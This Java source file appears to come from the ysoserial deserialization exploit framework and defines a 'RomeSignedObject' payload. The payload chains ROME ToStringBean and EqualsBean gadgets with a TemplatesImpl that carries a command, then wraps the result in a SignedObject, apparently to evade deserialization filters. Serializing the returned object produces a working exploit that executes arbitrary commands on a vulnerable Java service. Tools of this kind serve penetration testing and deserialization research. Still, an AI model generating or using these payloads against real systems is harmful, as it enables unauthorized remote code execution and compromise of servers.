package ysoserial.payloads;

import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.io.Serializable;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.HashMap;

@Dependencies("rome:rome:1.0")
@Authors({ Authors.F4NX1NG })
public class RomeSignedObject implements ObjectPayload<Object>{
    public Object getObject ( String command) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);

        ToStringBean toStringBean1 = new ToStringBean(Templates.class, o);
        EqualsBean  equalsBean1 = new EqualsBean(ToStringBean.class, toStringBean1);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        HashMap hashMap1 = Gadgets.makeMap(equalsBean1,equalsBean1);
        SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance("DSA"));

        ToStringBean toStringBean2 = new ToStringBean(SignedObject.class, signedObject);
        EqualsBean equalsBean2 = new EqualsBean(ToStringBean.class, toStringBean2);

        return Gadgets.makeMap(equalsBean2, equalsBean2);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(RomeSignedObject.class, args);
    }
}
